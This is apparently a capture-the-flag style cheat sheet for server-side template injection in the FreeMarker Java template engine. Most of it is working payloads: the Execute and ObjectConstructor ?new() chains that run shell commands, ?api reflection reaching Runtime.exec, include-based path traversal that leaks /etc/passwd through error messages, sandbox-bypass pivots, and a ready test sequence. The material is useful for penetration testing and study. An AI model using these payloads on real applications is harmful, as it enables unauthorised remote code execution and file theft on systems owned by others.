# FreeMarker — Java template engine

Marker: `${7*7}` → 49 (also `<#assign x=7*7>${x}`). Java's object
model is reachable through `?new()` and static-class accessors —
the RCE paths are version- and config-gated.

---

## 1. Confirm + enumerate

```ftl
${7*7}                    → 49
${7*'7'}                   → 49
${.data_model}             -- not a builtin — try:
${.vars}                   -- .vars — environment vars
${.now}                    -- current date — builtin
${.version}                -- FreeMarker version!
${.locale}                 -- locale
${.main_template_name}     -- template name
${.template_name}
${.output_encoding}
```

`.version` leaks the exact FreeMarker version — needed for the
exploit-DB-locked bypasses. `.data_model` is not a builtin but
data-model vars are in scope directly.

---

## 2. The RCE chain — `freemarker.template.utility.Execute`

```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
   → uid=33(www-data)...

${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
```

`?new()` instantiates a class by name — `Execute` runs the arg as
a shell command. Requires `?new` not blocked AND the classloader
can load `freemarker.template.utility.*` (bundled with freemarker).

Other utility classes:

```ftl
<#assign ot="freemarker.template.utility.ObjectConstructor"?new()>
${ot("java.lang.ProcessBuilder","id").start()}
   -- ProcessBuilder via ObjectConstructor

<#assign cc="freemarker.template.utility.ClassUtil"?new()>
   -- ClassUtil — class-for-name helpers

<#assign jt="freemarker.template.utility.JythonRuntime"?new()>
   -- if jython on classpath — python exec
```

---

## 3. The `.getClass()`/`?api` escape — protected accessor

```ftl
${"x".class}                         -- class object (blocked by default)
${"x"?api.getClass()}                 -- ?api exposes the java API
${"x"?api.getProtectionDomain()}      -- chain to classloader
```

`?api` exposes the raw Java API — gated by `api_builtin_enabled`
(most prod configs DISABLE it — check first).

```ftl
${user?api.getClass().forName('java.lang.Runtime')}
   -- if ?api on → full reflection → Runtime.exec
```

---

## 4. The `?new` restrictions and bypasses

`?new` is often restricted via `NewBuiltinClassResolver`:

```text
UNRESTRICTED_RESOLVER  → any class → RCE via Execute
ALLOWS_NOTHING_RESOLVER → no classes → ?new dead
TemplateClassResolver.SAFER_RESOLVER → whitelist of
   'safe' classes — Execute blocked since freemarker 2.3.17-ish
   bypass research: classloadable gadgets on classpath
```

When `?new` is restricted → pivot to:
- `?api` if enabled
- beans in the data-model that already expose dangerous methods
- `.getClass` chains if api enabled
- `include`/`import` of internal templates (source-leak, not RCE)

---

## 5. File read — `<#include>`/`<#import>`

```ftl
<#include "/etc/passwd">                -- treated as template —
                                        parse-error but the error
                                        LEAKS the file start!
<#include "../../../etc/passwd">          -- traversal out of the
                                          template dir
<#import "/etc/passwd" as x>            -- same leak path
```

The include-error-leak trick: FreeMarker includes the file, fails
to parse it as a template, and the EXCEPTION MESSAGE contains the
file's first line(s) — a partial file-read primitive.

---

## 6. The `<#assign>`/`${}` injection-context splits

```ftl
${value}                  -- interpolation context
<#assign x = USER_INPUT>   -- assign context — different escaping
<#if USER_INPUT>x</#if>    -- directive-arg context
<#list 1..5 as i>${i}</#list>
```

If the input lands inside `<#...>` args vs `${}` — the injection
syntax differs. Probe both.

---

## 7. Sandbox notes — the `TemplateClassResolver` reality

```text
?new blocked  → look for: ?api enabled? Execute allowed? beans?
              → else include/source paths only
```

Real-world: many prod apps run SAFER_RESOLVER — `Execute` blocked
since ~2.3.17. The remaining paths: `?api` if enabled, bean-
methods exposed via the data model, or the include file-leak.

---

## 8. Spring-Boot FreeMarker — the modern context

```ftl
${.data_model['flag']}               -- model var
${request}                            -- HttpServletRequest if bound
${request.getParameter('x')}          -- needs ?api or bound
${rc.getContext().getAttribute('x')}
```

Spring binds request/context vars — `RequestContext` leaks headers,
session, and sometimes secrets.

---

## 9. The test sequence

```ftl
${7*7}                                      -- confirm
${.version}                                  -- version leak
${"freemarker.template.utility.Execute"?new()("id")}   -- RCE try
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#include "/flag">                            -- file-leak try
${"x"?api.getClass()}                          -- ?api check
${.vars}                                       -- var dump
```
